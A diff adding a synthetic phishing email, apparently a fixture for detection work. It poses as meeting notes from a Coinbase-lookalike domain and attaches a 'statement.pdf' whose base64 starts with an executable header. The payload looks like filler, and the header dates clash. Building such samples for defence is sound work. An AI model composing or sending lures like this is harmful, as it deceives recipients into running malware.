@@ -1,0 +1,50 @@
+From: notice@coinbase-wallet.top
+To: victim21@example.com
+Subject: Meeting notes for the west power desk [ref A8E8BF9]
+Date: Tue, 18 Mar 2002 07:55:00 -0500
+Message-ID: <phish-201-9f3879a6-ee71-45d7-b971-f4359951ba83@coinbase-wallet.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 17 Mar 2002 07:47:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 08 Mar 2002 20:49:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 23 Mar 2002 17:00:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 28 Mar 2002 09:17:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 06 Mar 2002 17:03:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 27 Mar 2002 05:48:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 26 Mar 2002 22:32:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 19 Mar 2002 16:56:00 -0500
+Return-Path: <notice@coinbase-wallet.top>
+Reply-To: notice@coinbase-wallet.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=coinbase-wallet.top; dkim=pass header.d=coinbase-wallet.top; dmarc=pass header.from=coinbase-wallet.top
+Received-SPF: pass (mx.example.com: domain of notice@coinbase-wallet.top designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=coinbase-wallet.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-201-6345bd79"
+
+--bnd-p-201-6345bd79
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A8E8BF9
+
+Thanks,
+Colleague
+--bnd-p-201-6345bd79
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAHFrkD1KK0MYv4powEiIWxwVxGIjGa+rooS2XUtEt1ZM5eFZbT6BrBcqjFrmIG6QYk/4GHtV
+5Za17spRKkOVEOF9sBUKvW7YNkOiHchrzMga1b44owncrXjkx8MrbE/+LKNhdSjTp83Tz9kTlvnb
+OwTLzxXmlfgQarJsFDPYaHPbne6QhIvkQAB7HJmi9b4i3yP4H6y4J44qFGzg9C0ogfKX02hmfLZZ
+9YBqODjq0B6+y0nmYnbbRjjYS+rmvZd9gKZs/LqVxNFI5X744Ktif0Ycxs/kfaXYvlnvbeDTMbuI
+MyVO4L/k0nDWaEdtnoUJVvUvENaI7Z7tU19DyaXe64du+um1sJgtCo2RBWryVZWXEmBffllSdFSE
+Nm/iYquuLiXLYViTaFhyTrwlYS4+LXcNsuaRoyaSzqVGgCTxxc++mfxXJeqnuBoBbXd5tMkPCKYB
+8H2IjuhxOutQPM0xro3F7HFsPAe9NthEAemfZBtQq6zUrBe9kwO2jKeiiMpYOp212FsGpkUki89/
+0om0L3knPp07TNzXhnTXMkN0/McCv8inq23i0iSvQnrcs9v2czkV7rEdAio7AyNcSO7E2sUY0Oh7
+PaYI3purhEUbTJx4KqKmKwDgyLxHi4Vy02tpMQJpfOqmhPwkZxAFsumX9Povv71+hHxZmPcxEpeX
+ihqSUiuO7D9Ay4d//zBq0LqFf2eI391knSD44j3dsH/IUNXjhfvU0zEENUcSkF/HdBDgilNKaqJK
+O9OXB4EChdzWKQziORZsCFuaWOGxl7ET9HbRM1xHLvRqJNXvBeJcUKzRkq48xSx1KEzU52tuYkoK
+qo6IbqWEvumrXW1ekg==
+
+--bnd-p-201-6345bd79--
